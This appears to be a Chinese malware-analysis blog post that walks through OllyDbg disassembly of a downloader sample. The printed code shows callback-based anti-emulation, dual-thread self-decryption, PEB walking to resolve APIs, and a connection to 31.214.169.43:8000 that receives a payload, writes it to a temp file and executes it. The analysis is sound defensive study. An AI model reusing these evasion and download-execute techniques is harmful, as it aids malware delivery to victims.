@@ -1,0 +1,724 @@
+
+# 样本的简单分析
+
+> 原文：[`www.pediy.com/kssd/pediy12/143227.html`](https://www.pediy.com/kssd/pediy12/143227.html)
+
+找了个样本简单分析下，希望能在看雪继续学习。
+
+`PEID` 打开文件只有两个节未知~
+
+输入表很少 `CreateThread` `ExitProcess` `Sleep` `WaitForSingleObject`
+
+发现调用了 `gdi32.dll` 函数 `EnumFontsA` 上网查 是一个例举指定设备可用的字体
+
+`user32.dll` 里的 `GetDCEx` 检索指定窗口客户区域或整个屏幕的显示设备上下文环境的句柄，在随后的 GDI 函数中可以使用该句柄在设备上下文环境中绘图。
+
+用 `od` 看看把
+
+代码:
+
+```
+001030EF  >  $  B8 29090000   mov     eax, 929
+001030F4   .  40            inc     eax
+001030F5   .  B9 58010000   mov     ecx, 158
+001030FA   .  BB 3A150000   mov     ebx, 153A
+001030FF   .  40            inc     eax
+00103100   .  40            inc     eax
+00103101   .  03C0          add     eax, eax
+00103103   .  40            inc     eax
+00103104   .  03C1          add     eax, ecx
+00103106   .  03C3          add     eax, ebx
+00103108   .  40            inc     eax
+00103109   .  40            inc     eax
+0010310A   >  C1E8 02       shr     eax, 2
+0010310D   .^ E2  FB       loopd   short 0010310A
+0010310F   .  51            push    ecx
+00103110   .  68  EB2E1000  push    00102EEB
+00103115   .  6A  01        push    1                                             \Flags = DCX_WINDOW
+00103117   .  49            dec     ecx
+00103118   .  50            push    eax                                          |hRegionClip = NULL
+00103119   .  41            inc     ecx
+0010311A   .  51            push    ecx                                           |hWnd = NULL
+0010311B   .  E8  74FDFFFF  call    00102E94                                   Call GetDCEx
+00103120   .  A3  B9191000  mov     dword ptr [1019B9], eax
+00103125   .^ E9  6FFDFFFF  jmp     00102E99
+
+00102E99   > /B9 C42E1000  mov     ecx, 00102EC4
+00102E9E   . |81E9 C4080000 sub     ecx, 8C4
+00102EA4   . |51            push    ecx              lParam = info.00102600
+00102EA5   . |68  CD2E1000  push    00102ECD          CallbackFunc = info.00102ECD
+00102EAA   . |FF35 A5191000 push    dword ptr [1019A5]  FaceName = NULL
+00102EB0   . |FF35 B9191000 push    dword ptr [1019B9]  hDC = 01010058
+00102EB6   . |E8  D4FFFFFF  call    00102E8F     Call EnumFontsA
+00102EBB   . |B8  00000000  mov     eax, 0
+00102EC0   . |8BC8         mov     ecx, eax
+00102EC2   . |8BD1         mov     edx, ecx
+00102EC4   . |33C0         xor     eax, eax
+00102EC6   . |50            push    eax                                             ; /ExitCode => 0
+00102EC7   . |E8  6A020000  call    <jmp.&kernel32.ExitProcess>         ; \ExitProcess
+00102ECC   . |C3            retn
+00102ECD   . |8B4424 10     mov     eax, dword ptr [esp+10]         EnumFontsA 回调函数
+00102ED1   . |05  C4080000  add     eax, 8C4     清空了 102EC4 到 102ECB 的数据
+00102ED6   . |C700 90909090 mov     dword ptr [eax], 90909090  上面的 exitprocess 没了，原来是骗人用的
+00102EDC   . |83C0 04       add     eax, 4
+00102EDF   . |C700 90909090 mov     dword ptr [eax], 90909090
+00102EE5   . |B8  00000000  mov     eax, 0
+00102EEA   . |C3            retn
+00102EEB   . /EB  5D       jmp     short 00102F4A
+```
+
+原来上面这些操作全部……，这样的思路是不是就能过了杀软的虚拟机引擎了？还是有其他目的？
+
+回调函数去修改原程序的执行流程~下面应该到真正的地方了吧~
+
+代码:
+
+```
+00102F4A   > \90            nop
+00102F4B   .  90            nop
+00102F4C   .  90            nop
+00102F4D   .  BB 00000000   mov     ebx, 0
+00102F52   .  B9 04000000   mov     ecx, 4
+00102F57   >  53            push    ebx                                     ; |pThreadParm
+00102F58   .^ E2  FD       loopd   short 00102F57                  ; |
+00102F5A   .  68  992F1000  push    00102F99                        ; |ThreadFunction = info.00102F99
+00102F5F   .  53            push    ebx                                        ; |StackSize
+00102F60   .  53            push    ebx                                        ; |pSecurity
+00102F61   .  E8  CA010000  call    <jmp.&kernel32.CreateThread>     \CreateThread
+00102F66   .  A3  A1191000  mov     dword ptr [1019A1], eax
+00102F6B   .  BB 00000000   mov     ebx, 0
+00102F70   .  53            push    ebx
+00102F71   .  53            push    ebx                                        ; /pThreadId => NULL
+00102F72   .  53            push    ebx                                        ; |CreationFlags => 0
+00102F73   .  53            push    ebx                                        ; |pThreadParm => NULL
+00102F74   .  68  DF2F1000  push    00102FDF                          ; |ThreadFunction = info.00102FDF
+00102F79   .  53            push    ebx                                        ; |StackSize => 0
+00102F7A   .  53            push    ebx                                        ; |pSecurity => NULL
+00102F7B   .  E8  B0010000  call    <jmp.&kernel32.CreateThread>    \CreateThread
+00102F80   .  A3  A5191000  mov     dword ptr [1019A5], eax
+00102F85   .  A1  A1191000  mov     eax, dword ptr [1019A1]
+00102F8A   .  6A  FF        push    -1                                        ; /Timeout = INFINITE
+00102F8C   .  50            push    eax                                      ; |hObject => NULL
+00102F8D   .  E8  B0010000  call    <jmp.&kernel32.WaitForSingleObje>; \WaitForSingleObject
+00102F92   .  6A  00        push    0                                         ; /ExitCode = 0
+00102F94   .  E8  9D010000  call    <jmp.&kernel32.ExitProcess>      \ExitProcess
+```
+
+创建了两个线程，地址：`102F99` 和 `102fDf` 看看这两个线程在干吗~
+
+代码:
+
+```
+102F99:
+00102F99    8B35 B1191000   mov     esi, dword ptr [1019B1]         ; info.0010130C 看来这个地址很重要~
+00102F9F    8B0D B5191000   mov     ecx, dword ptr [1019B5]        0x691 这个数是干啥用的？一般都是次数~~
+00102FA5    56              push    esi
+00102FA6    8BF1            mov     esi, ecx
+00102FA8    56              push    esi
+00102FA9    6A 01           push    1
+00102FAB    E8 8C010000     call    <jmp.&kernel32.Sleep>     
+00102FB0    833D AD191000 0>cmp     dword ptr [1019AD], 2  1019ad 里面存数值来判断是否线程继续执行下去~
+00102FB7  ^ 75  F0          jnz     short 00102FA9       如果 不是 2，那就处于无限的 sleep 1ms 了
+00102FB9    EB 15           jmp     short 00102FD0       初始为 2 跳到 102fd0
+
+00102FD0    59              pop     ecx        0x691 要做动作了~
+00102FD1    5E              pop     esi        0010130c(8c9b66f4)
+00102FD2    A1 A9191000     mov     eax, dword ptr [1019A9]  eax:674E8cEB   
+00102FD7    8A1E            mov     bl, byte ptr [esi]       取出 f4
+00102FD9    32D8            xor     bl, al        与 67 异或  EBX:1f
+00102FDB    881E            mov     byte ptr [esi], bl       结果存到 esi:0010130c 中
+00102FDD  ^ EB  DC          jmp     short 00102FBB
+
+00102FBB    46              inc     esi        esi+1  0010130D
+00102FBC    50              push    eax          
+00102FBD    B8 AD191000     mov     eax, 001019AD
+00102FC2    C700 00000000   mov     dword ptr [eax], 0    更该了线程的执行条件，为 0。
+00102FC8    58              pop     eax
+00102FC9  ^ E2  DA          loopd   short 00102FA5       看来要执行 0x691 次        
+00102FCB  ^ E9  61E9FFFF    jmp     00101931       回到 sleep 了！因为之前更改了。所以一直在 sleep，估计下面的线程会更改这个值
+```
+
+这个线程来看是用来解密用的了，数据大小 `0x691`  启始地址：`0010130C` 开始~解密代码段？看来 `00101931` 这个地址是解码后的执行的地址了。
+
+再看看另一个线程 `102fDf`
+
+代码:
+
+
+
+```
+00102FDF    B8 01000000     mov     eax, 1        
+00102FE4    A3 AD191000     mov     dword ptr [1019AD], eax  更改了上面线程的执行条件~1019ad:1
+00102FE9    68 A9191000     push    001019A9      这个是上个线程用来解密用的~
+00102FEE    EB 02          jmp     short 00102FF2
+
+
+00102FF2    E8 F6FEFFFF     call    00102EED      这个函数~
+
+00102EED    59             pop     ecx
+00102EEE    5A             pop     edx
+00102EEF    51             push    ecx
+00102EF0    A1 9D191000    mov     eax, dword ptr [10199D]  10199d:eb674e8c 这个跟 1019A9 的正好相反
+00102EF5    EB 18         jmp     short 00102F0F
+
+00102F0F    8BC8            mov     ecx, eax      ecx:EB674E8C     
+00102F11    D1E0            shl     eax, 1        左移 1 位 D6CE9D18
+00102F13    D1E0            shl     eax, 1        继续左移 AD9D3A30
+00102F15    D1C0            rol     eax, 1        左移，把最高位放到最低位：5B3A7461
+00102F17    83E0 FA         and     eax, FFFFFFFA      和 FFFFFFFA 与运算 ：5B3A7460
+00102F1A  ^ EB DD          jmp     short 00102EF9
+
+
+00102EF9    83E0 FD        and     eax, FFFFFFFD      和 FFFFFFFD 与运算  两个与运算就是把二进制位的最后三位清零
+00102EFC    33C1            xor     eax, ecx        再和之前的自己异或运算：B05D3AEC
+00102EFE    05 BD040000    add     eax, 4BD      +4BD :B05D3FA9
+00102F03    A3 9D191000    mov     dword ptr [10199D], eax 在放回去~~
+00102F08    C1C8 10        ror     eax, 10       右移，跟 rol 相反，这条指令就是低 16 位与高 16 位交换位置
+00102F0B    EB 0F         jmp     short 00102F1C      ~3FA9B05D
+
+
+00102F1C    C1C8 04        ror     eax, 4       上面说过着指令了，就不在看了。
+00102F1F    C1C8 02        ror     eax, 2
+00102F22    C1C8 02        ror     eax, 2       5D3FA9B0
+00102F25    8902            mov     dword ptr [edx], eax    edx:001019A9 更改了上个线程的密钥
+00102F27    83C2 04        add     edx, 4
+00102F2A    C702 02000000  mov     dword ptr [edx], 2    edx:001019ad 更该了上个线程的执行条件
+00102F30    C3             retn
+
+00102FDF    B8 01000000     mov     eax, 1
+00102FE4    A3 AD191000     mov     dword ptr [1019AD], eax
+00102FE9    68 A9191000     push    001019A9
+00102FEE    EB 02          jmp     short 00102FF2
+00102FF0    40             inc     eax
+00102FF1    43             inc     ebx
+00102FF2    E8 F6FEFFFF     call    00102EED
+00102FF7    6A 01         push    1
+00102FF9    E8 3E010000    call    <jmp.&kernel32.Sleep>   又开始 sleep 了
+00102FFE    833D AD191000 0>cmp     dword ptr [1019AD], 0  原来也是这个条件，判断是否为 0，为 0 就改变为 1，然后去算密钥
+00103005  ^ 74 D8         je      short 00102FDF
+00103007  ^ EB EE         jmp     short 00102FF7      无限 sleep 了
+
+```
+
+这个线程就是根据自己的算法 更改要解密的密钥，然后更改条件让上个线程去继续执行  
+
+两个线程的目的已经很清楚了，一个线程去解密，另一个线程去算密钥。  
+
+跳到了这里~~解码后的~~  
+
+代码:
+
+```
+00101931    E8 87FEFFFF     call    001017BD
+00101936    68 3E131000     push    0010133E                     ; ASCII "sfe34sde3"
+0010193B    6A 00         push    0
+0010193D    6A 01         push    1
+0010193F    6A 00         push    0
+00101941    E8 DFFFFFFF    call    00101925
+00101946    83F8 00       cmp     eax, 0
+00101949    74 19         je      short 00101964
+0010194B    E8 DBFFFFFF   call    0010192B
+00101950    83F8 00       cmp     eax, 0
+00101953    75 0F         jnz     short 00101964
+00101955    E8 D6FCFFFF   call    00101630
+0010195A    E8 0BFAFFFF   call    0010136A
+0010195F    E8 32FAFFFF   call    00101396
+00101964    6A 00         push    0
+00101966    E8 78FFFFFF   call    001018E3
+0010196B    0000          add     byte ptr [eax], al
+0010196D    0000          add     byte ptr [eax], al
+0010196F    0000          add     byte ptr [eax], al
+
+```
+
+第一个 CALL  
+
+代码:
+
+```
+001017BD    56             push    esi
+001017BE    57             push    edi
+001017BF    51             push    ecx
+001017C0    53             push    ebx
+001017C1    52             push    edx
+001017C2    B8 00000000    mov     eax, 0
+001017C7    83C0 20       add     eax, 20
+001017CA    83C0 10       add     eax, 10
+001017CD    64:8B00       mov     eax, dword ptr fs:[eax]       TEB 结构的 0x30 偏移处是 PEB   
+001017D0    8B40 0C       mov     eax, dword ptr [eax+C]       PEB 的 0x0c 处指向 PEB_LDR_DATA
+001017D3    8B70 1C       mov     esi, dword ptr [eax+1C]      InInitializationOrderModuleList
+001017D6    AD             lods    dword ptr [esi]
+001017D7    8B40 08       mov     eax, dword ptr [eax+8]      kernel32 的基址
+001017DA    A3 AC171000   mov     dword ptr [1017AC], eax
+001017DF    BA 1A171000   mov     edx, 0010171A                 ; ASCII "GetProcAddress"
+001017E4    8BD8          mov     ebx, eax
+001017E6    8B73 3C     mov     esi, dword ptr [ebx+3C]      kernel32 的 PE 头偏移
+001017E9    8B7433 78   mov     esi, dword ptr [ebx+esi+78]   
+001017ED    03F3          add     esi, ebx          输出表
+001017EF    8B7E 20     mov     edi, dword ptr [esi+20]   
+001017F2    03FB          add     edi, ebx          AddressOfFunction 的 RVA
+001017F4    8B4E 14     mov     ecx, dword ptr [esi+14]         AddressOfFunction 的条目数量
+001017F7    33ED          xor     ebp, ebp
+001017F9    56             push    esi
+001017FA    57             push    edi
+001017FB    51             push    ecx
+001017FC    8B3F          mov     edi, dword ptr [edi]
+001017FE    03FB          add     edi, ebx          AddressOfFunction 的第一个元素
+00101800    8BF2          mov     esi, edx
+00101802    6A 0E         push    0E
+00101804    59             pop     ecx
+00101805    F3:A6         repe    cmps byte ptr es:[edi], byte ptr>
+00101807    74 08         je      short 00101811
+00101809    59             pop     ecx
+0010180A    5F             pop     edi
+0010180B    83C7 04     add     edi, 4
+0010180E    45             inc     ebp
+0010180F  ^ E2 E9         loopd   short 001017FA    AddressOfFunction 中查找 GetProcAddress
+00101811    59             pop     ecx
+00101812    5F             pop     edi
+00101813    5E             pop     esi
+00101814    8BCD          mov     ecx, ebp
+00101816    8B46 24     mov     eax, dword ptr [esi+24]  AddressOfNameOrdinals
+00101819    03C3          add     eax, ebx
+0010181B    D1E1          shl     ecx, 1
+0010181D    03C1          add     eax, ecx
+0010181F    33C9          xor     ecx, ecx
+00101821    66:8B08     mov     cx, word ptr [eax]
+00101824    8B46 1C     mov     eax, dword ptr [esi+1C]   
+00101827    03C3          add     eax, ebx
+00101829    C1E1 02     shl     ecx, 2
+0010182C    03C1          add     eax, ecx
+0010182E    8B00          mov     eax, dword ptr [eax]     
+00101830    03C3          add     eax, ebx                             eax:GetProcAddress 基址
+00101832    A3 90171000   mov     dword ptr [101790], eax         
+00101837    68 0B171000   push    0010170B                         ; ASCII "LoadLibraryExA"
+0010183C    FF35 AC171000 push    dword ptr [1017AC]
+00101842    E8 B4000000   call    001018FB
+00101847    A3 8C171000   mov     dword ptr [10178C], eax
+
+```
+
+根据 `TEB` 的结构找到 `PEB`，然后找 `kernel32` 的基址，最后目标是查找 `GetProcAddress`，循环了 `0x198` 次  
+
+查找输出函数的方法~~就参照加密解密 3 版的输出表结构吧~~然后用 `GetProcAddress`  
+
+找到`"LoadLibraryExA"`，填充对应的跳转表~不对的地方请前辈指点~继续下面的~  
+
+代码:
+
+
+
+## 代码段 1
+
+```
+0010184C    6A 00           push    0
+0010184E    6A 00           push    0
+00101850    68 54161000     push    00101654                      ; ASCII "ws2_32.dll"
+00101855    FFD0           call    eax              eax："LoadLibraryExA"，
+00101857    A3 A7161000     mov     dword ptr [1016A7], eax        去 load ws2_32.dll 1016a7:ws2_32.dll 基址
+0010185C    8BD8           mov     ebx, eax
+0010185E    BE 5F161000     mov     esi, 0010165F                   ; ASCII "socket"
+00101863    BF AB161000     mov     edi, 001016AB
+00101868    E8 2A000000     call    00101897
+
+
+
+00101897    4E             dec     esi
+00101898    46             inc     esi
+00101899    803E 00        cmp     byte ptr [esi], 0            判断参数 函数名是否为空
+0010189C    74 14          je      short 001018B2
+0010189E    56             push    esi
+0010189F    53             push    ebx
+001018A0    E8 56000000     call    001018FB                      ; jmp 到 kernel32.GetProcAddress
+001018A5    8907           mov     dword ptr [edi], eax
+001018A7    83C7 04       add     edi, 4
+001018AA    46             inc     esi
+001018AB    803E 00        cmp     byte ptr [esi], 0
+001018AE   ^ 74 E8         je      short 00101898
+001018B0   ^ EB F8         jmp     short 001018AA
+001018B2    C3             retn
+```
+
+用上面得到的 `GetProcAddress` 去找 `ws2_32.dll` 输入表的函数地址并填充
+
+这些函数：`socket.connect.recv.send.closesocket.shutdown.gethostbyname.WSAStartup.`
+
+看到这些函数你想到了什么了呢？:)继续下一个 call
+
+代码:
+
+```
+0010186D    6A 00           push    0
+0010186F    6A 00           push    0
+00101871    68 B0171000     push    001017B0                      ; ASCII "kernel32.dll"
+00101876    E8 7A000000     call    001018F5                      ; jmp 到 kernel32.LoadLibraryExA
+0010187B    A3 AC171000     mov     dword ptr [1017AC], eax
+00101880    8BD8           mov     ebx, eax
+00101882    BE CB161000     mov     esi, 001016CB                  ; ASCII "ExitProcess"
+00101887    BF 78171000     mov     edi, 00101778
+0010188C    E8 06000000     call    00101897
+```
+
+跟上面的操作一样~~这次是 `kernel32.dll` 的~~看看都用了什么函数把~
+
+`ExitProcess.VirtualAlloc.VirtualFree. CreateFileA.CreateProcessA.LoadLibraryExA.GetProcAddress.GetTempPathA.`
+
+`GetTempFileNameA.WriteFile.CloseHandle.CreateEventA.GetLastError`
+
+~~看看像什么？~~
+
+ok~~第一个 call 结束了~~貌似刚跑完外面一层~~具体代码还没有到~~~继续把~~
+
+看来直接第四个 call 就行了~
+
+代码:
+
+```
+00101931    E8 87FEFFFF     call    001017BD
+00101936    68 3E131000     push    0010133E                     ; EventName = "sfe34sde3"
+0010193B    6A 00           push    0     InitiallySignaled = FALSE
+0010193D    6A 01           push    1     ManualReset = TRUE
+0010193F    6A 00           push    0     pSecurity = NULL
+00101941    E8 DFFFFFFF     call    00101925                      ; jmp 到 kernel32.CreateEventA
+00101946    83F8 00        cmp     eax, 0
+00101949    74 19          je      short 00101964
+0010194B    E8 DBFFFFFF     call    0010192B                      ; jmp 到 ntdll.RtlGetLastWin32Error
+00101950    83F8 00        cmp     eax, 0
+00101953    75 0F          jnz     short 00101964
+00101955    E8 D6FCFFFF     call    00101630        第 4 个 call
+0010195A    E8 0BFAFFFF     call    0010136A        第 5 个 call
+0010195F    E8 32FAFFFF     call    00101396        第 6 个 call
+00101964    6A 00           push    0
+00101966    E8 78FFFFFF     call    001018E3                      ; jmp 到 kernel32.ExitProcess
+0010196B    0000           add     byte ptr [eax], al
+0010196D    0000           add     byte ptr [eax], al
+```
+
+第四个 call
+
+代码:
+
+```
+00101630    6A 04           push    4
+00101632    68 00100000     push    1000
+00101637    68 8E010000     push    18E
+0010163C    6A 00           push    0
+0010163E    E8 A6020000     call    001018E9                      ; jmp 到 kernel32.VirtualAlloc
+00101643    A3 2C161000     mov     dword ptr [10162C], eax
+00101648    50             push    eax
+00101649    68 02020000     push    202
+0010164E    E8 8A020000     call    001018DD                      ; jmp 到 ws2_32.WSAStartup
+00101653    C3             retn
+```
+
+看来开始 socket 通信了~~第一个 call 结束完就进入正题了~~~
+
+第五个 call
+
+代码:
+
+```
+0010136A    68 3A060000     push    63A
+0010136F    E8 91010000     call    00101505
+00101374    A3 32131000     mov     dword ptr [101332], eax
+00101379    05 FF000000     add     eax, 0FF
+0010137E    A3 36131000     mov     dword ptr [101336], eax
+00101383    05 FF000000     add     eax, 0FF
+00101388    A3 3A131000     mov     dword ptr [10133A], eax
+0010138D    83C0 44        add     eax, 44
+00101390    A3 48131000     mov     dword ptr [101348], eax
+00101395    C3             retn
+
+00101505    55             push    ebp
+00101506    8BEC           mov     ebp, esp
+00101508    6A 04           push    4
+0010150A    68 00100000     push    1000
+0010150F    FF75 08       push    dword ptr [ebp+8]
+00101512    6A 00           push    0
+00101514    E8 D0030000     call    001018E9                      ; jmp 到 kernel32.VirtualAlloc
+00101519    74 0D          je      short 00101528
+0010151B    50             push    eax
+0010151C    6A 00           push    0
+0010151E    FF75 08       push    dword ptr [ebp+8]
+00101521    50             push    eax
+00101522    E8 C8FFFFFF     call    001014EF
+00101527    58             pop     eax
+00101528    C9             leave
+00101529    C2 0400        retn    4
+```
+
+代码:
+
+```
+00101396    55             push    ebp
+00101397    8BEC           mov     ebp, esp
+00101399    83C4 E8       add     esp, -18
+0010139C    E8 7F020000     call    00101620
+看看这个里面干啥~~
+00101620    6A 06           push    6
+00101622    6A 01           push    1
+00101624    6A 02           push    2
+00101626    E8 88020000     call    001018B3                      ; jmp 到 ws2_32.socket
+0010162B    C3             retn
+都告诉咱们了~~
+009AFF88   00000002  |Family = AF_INET
+009AFF8C   00000001  |Type = SOCK_STREAM
+009AFF90   00000006  \Protocol = IPPROTO_TCP
+下一个~~
+001013A1    83F8 FF        cmp     eax, -1
+001013A4    0F84 0B010000   je      001014B5
+001013AA    A3 19131000     mov     dword ptr [101319], eax
+001013AF    50             push    eax
+001013B0    E8 77010000     call    0010152C
+
+socket 保存在 101319
+0010152C    55             push    ebp
+0010152D    8BEC           mov     ebp, esp
+0010152F    BF 0C131000     mov     edi, 0010130C
+00101534    8B07           mov     eax, dword ptr [edi]
+00101536    66:C705 1D13100>mov     word ptr [10131D], 2
+0010153F    A3 21131000     mov     dword ptr [101321], eax
+00101544    66:A1 10131000  mov     ax, word ptr [101310]
+0010154A    66:A3 1F131000  mov     word ptr [10131F], ax
+00101550    6A 10           push    10
+00101552    68 1D131000     push    0010131D
+00101557    FF75 08       push    dword ptr [ebp+8]
+0010155A    E8 5A030000     call    001018B9                      ; jmp 到 ws2_32.connect
+0010155F    C9             leave
+00101560    C2 0400        retn    4
+
+009AFF80   00000070  |Socket = 70
+009AFF84   0010131D  |pSockAddr = info.0010131D
+009AFF88   00000010  \AddrLen = 10 (16.)
+```
+
+`1F D6 A9 2B` 这个就是 ip 了~~二进制：`00011111 11010110 10101001 00101011`
+
+`31.214.169.43`~~美国的 ip~~~
+
+其实也不用这么麻烦~~connect 后~~直接 xuetr 看看通信地址就 ok 了~~~`31.214.169.43：8000`
+
+代码:
+
+```
+001013C1    68 12131000     push    00101312
+001013C6    FF35 19131000   push    dword ptr [101319]
+001013CC    E8 F4040000     call    001018C5                      ; jmp 到 ws2_32.send
+009AFF88   00000070  |Socket = 70
+009AFF8C   00101312  |Data = info.00101312
+009AFF90   00000007  |DataSize = 7
+009AFF94   00000000  \Flags = 0
+
+001013D1    8D45 F8        lea     eax, dword ptr [ebp-8]
+001013D4    50             push    eax
+001013D5    8D45 FC        lea     eax, dword ptr [ebp-4]
+001013D8    50             push    eax
+001013D9    FF35 19131000   push    dword ptr [101319]     socket
+001013DF    E8 7F010000     call    00101563
+```
+
+代码:
+
+
+
+```
+00101563    55                 push    ebp
+00101564    8BEC               mov     ebp, esp
+00101566    83C4 EC            add     esp, -14
+00101569    56                 push    esi
+0010156A    57                 push    edi
+0010156B    51                 push    ecx
+0010156C    C745 F0 0000000>   mov     dword ptr [ebp-10], 0
+00101573    C745 F4 0000000>   mov     dword ptr [ebp-C], 0
+0010157A    68 00040000        push    400
+0010157F    E8 81FFFFFF       call    00101505
+
+00101505    55                 push    ebp
+00101506    8BEC               mov     ebp, esp
+00101508    6A 04              push    4
+0010150A    68 00100000        push    1000
+0010150F    FF75 08            push    dword ptr [ebp+8]
+00101512    6A 00              push    0
+00101514    E8 D0030000        call    001018E9 ; jmp 到 kernel32.VirtualAlloc
+
+00101528    C9                 leave
+00101529    C2 0400            ret     4
+
+
+009AFF48   00000000  |Address = NULL
+009AFF4C   00000400  |Size = 400 (1024.)
+009AFF50   00001000  |AllocationType = MEM_COMMIT
+009AFF54   00000004  \Protect = PAGE_READWRITE
+
+00101584    8945 FC            mov     dword ptr [ebp-4], eax
+00101587    6A 00              push    0
+00101589    68 00040000        push    400
+0010158E    FF75 FC            push    dword ptr [ebp-4]
+00101591    FF75 08            push    dword ptr [ebp+8]
+00101594    E8 26030000        call    001018BF ; jmp 到 ws2_32.recv
+
+009AFF54   00000070  |Socket = 70
+009AFF58   00AF0000  |Buffer = 00AF0000
+009AFF5C   00000400  |BufSize = 400 (1024.)
+009AFF60   00000000  \Flags = 0
+```
+
+代码:
+
+```
+00101599    83F8 00            cmp     eax, 0
+0010159C    74 59              je      short 001015F7
+0010159E    83F8 FF            cmp     eax, -1
+001015A1    74 4B              je      short 001015EE
+001015A3    8945 F8            mov     dword ptr [ebp-8], eax
+001015A6    0345 F0            add     eax, dword ptr [ebp-10]
+001015A9    50                 push    eax
+001015AA    E8 56FFFFFF       call    00101505
+
+
+00101505    55                 push    ebp
+00101506    8BEC               mov     ebp, esp
+00101508    6A 04              push    4
+0010150A    68 00100000        push    1000
+0010150F    FF75 08            push    dword ptr [ebp+8]
+00101512    6A 00              push    0
+00101514    E8 D0030000        call    001018E9 ; jmp 到 kernel32.VirtualAlloc
+00101519    74 0D              je      short 00101528
+0010151B    50                 push    eax
+0010151C    6A 00              push    0
+0010151E    FF75 08            push    dword ptr [ebp+8]
+00101521    50                 push    eax
+00101522    E8 C8FFFFFF       call    001014EF
+00101527    58                 pop     eax
+00101528    C9                 leave
+00101529    C2 0400            ret     4
+
+001015AF    50                 push    eax
+001015B0    8BF8               mov     edi, eax
+001015B2    8B4D F0            mov     ecx, dword ptr [ebp-10]
+001015B5    83F9 00            cmp     ecx, 0
+001015B8    74 05              je      short 001015BF
+001015BA    8B75 F4            mov     esi, dword ptr [ebp-C]
+001015BD    F3:A4              rep     movs byte ptr es:[edi], byte ptr>
+001015BF    8B4D F8            mov     ecx, dword ptr [ebp-8]
+001015C2    8B75 FC            mov     esi, dword ptr [ebp-4]
+001015C5    F3:A4              rep     movs byte ptr es:[edi], byte ptr>
+001015C7    8B45 F0            mov     eax, dword ptr [ebp-10]
+001015CA    0345 F8            add     eax, dword ptr [ebp-8]
+001015CD    8945 F0            mov     dword ptr [ebp-10], eax
+001015D0    68 00800000        push    8000
+001015D5    6A 00              push    0
+001015D7    FF75 F4            push    dword ptr [ebp-C]
+001015DA    E8 10030000        call    001018EF ; jmp 到 kernel32.VirtualFree
+001015DF    58                 pop     eax
+001015E0    8945 F4            mov     dword ptr [ebp-C], eax
+001015E3  ^ EB A2             jmp     short 00101587
+001015E5    C745 EC 0000000>   mov     dword ptr [ebp-14], 0
+001015EC    EB 09              jmp     short 001015F7
+001015EE    C745 EC 0100000>   mov     dword ptr [ebp-14], 1
+001015F5    EB 00              jmp     short 001015F7
+001015F7    68 00800000        push    8000
+001015FC    6A 00              push    0
+001015FE    FF75 FC            push    dword ptr [ebp-4]
+00101601    E8 E9020000        call    001018EF ; jmp 到 kernel32.VirtualFree
+00101606    8B45 F4            mov     eax, dword ptr [ebp-C]
+00101609    8B7D 0C            mov     edi, dword ptr [ebp+C]
+0010160C    8907               mov     dword ptr [edi], eax
+0010160E    8B45 F0            mov     eax, dword ptr [ebp-10]
+00101611    8B7D 10            mov     edi, dword ptr [ebp+10]
+00101614    8907               mov     dword ptr [edi], eax
+00101616    8B45 EC            mov     eax, dword ptr [ebp-14]
+00101619    59                 pop     ecx
+0010161A    5F                 pop     edi
+0010161B    5E                 pop     esi
+0010161C    C9                 leave
+0010161D    C2 0C00            ret     0C
+```
+
+循环接收数据
+
+代码:
+
+
+
+```asm
+001013E4    8B7D FC         mov     edi, dword ptr [ebp-4]
+001013E7    8B07          mov     eax, dword ptr [edi]
+001013E9    A3 12131000   mov     dword ptr [101312], eax
+001013EE    83C7 04       add     edi, 4
+001013F1    836D F8 04    sub     dword ptr [ebp-8], 4
+001013F5    897D E8       mov     dword ptr [ebp-18], edi
+001013F8    6A 04         push    4
+001013FA    FF75 E8       push    dword ptr [ebp-18]
+001013FD    E8 B5000000   call    001014B7
+00101402    8B7D E8       mov     edi, dword ptr [ebp-18]
+00101405    8B0F          mov     ecx, dword ptr [edi]
+00101407    294D F8       sub     dword ptr [ebp-8], ecx
+0010140A    836D F8 04    sub     dword ptr [ebp-8], 4
+0010140E    8345 E8 04    add     dword ptr [ebp-18], 4
+00101412    51            push    ecx
+00101413    FF75 E8       push    dword ptr [ebp-18]
+00101416    E8 9C000000   call    001014B7
+0010141B    8B7D E8       mov     edi, dword ptr [ebp-18]
+0010141E    897D F4       mov     dword ptr [ebp-C], edi
+00101421    894D F0       mov     dword ptr [ebp-10], ecx
+00101424    014D E8       add     dword ptr [ebp-18], ecx
+00101427    FF35 32131000 push    dword ptr [101332]
+0010142D    68 FE000000   push    0FE
+00101432    E8 CA040000   call    00101901                  ; jmp 到 kernel32.GetTempPathA
+00101437    FF35 36131000 push    dword ptr [101336]
+0010143D    6A 00         push    0
+0010143F    68 2D131000   push    0010132D                    ; ASCII "4ere"
+00101444    FF35 32131000 push    dword ptr [101332]
+0010144A    E8 B8040000   call    00101907                  ; jmp 到 kernel32.GetTempFileNameA
+0010144F    6A 00         push    0
+00101451    68 80000000   push    80
+00101456    6A 02         push    2
+00101458    6A 00         push    0
+0010145A    6A 00         push    0
+0010145C    68 00000040   push    40000000
+00101461    FF35 36131000 push    dword ptr [101336]
+00101467    E8 A1040000   call    0010190D                  ; jmp 到 kernel32.CreateFileA
+0010146C    50            push    eax
+0010146D    6A 00         push    0
+0010146F    8BDC          mov     ebx, esp
+00101471    6A 00         push    0
+00101473    53            push    ebx
+00101474    FF75 F0       push    dword ptr [ebp-10]
+00101477    FF75 F4       push    dword ptr [ebp-C]
+0010147A    50            push    eax
+0010147B    E8 99040000   call    00101919                  ; jmp 到 kernel32.WriteFile
+00101480    5B            pop     ebx
+00101481    E8 99040000   call    0010191F                  ; jmp 到 kernel32.CloseHandle
+00101486    FF35 48131000 push    dword ptr [101348]
+0010148C    FF35 3A131000 push    dword ptr [10133A]
+00101492    6A 00         push    0
+00101494    6A 00         push    0
+00101496    6A 20         push    20
+00101498    6A 00         push    0
+0010149A    6A 00         push    0
+0010149C    6A 00         push    0
+0010149E    6A 00         push    0
+001014A0    FF35 36131000 push    dword ptr [101336]
+001014A6    E8 68040000   call    00101913                  ; jmp 到 kernel32.CreateProcessA
+001014AB    837D F8 00    cmp     dword ptr [ebp-8], 0
+001014AF  ^ 0F85 43FFFFFF jnz     001013F8
+001014B5    C9            leave
+001014B6    C3            retn
+```
+
+看来是个下载者。
+
+重新梳理思路：
+
+正规软件函数的入口，然后用回调函数去改变执行流程。启动双线程去给自己真正的代码解密，然后通过`TEB`查找`kernel32`的基址，根据输出表查找`GetProcess`、`LoadLibrary`这样就有了后面所用到的函数地址。
+
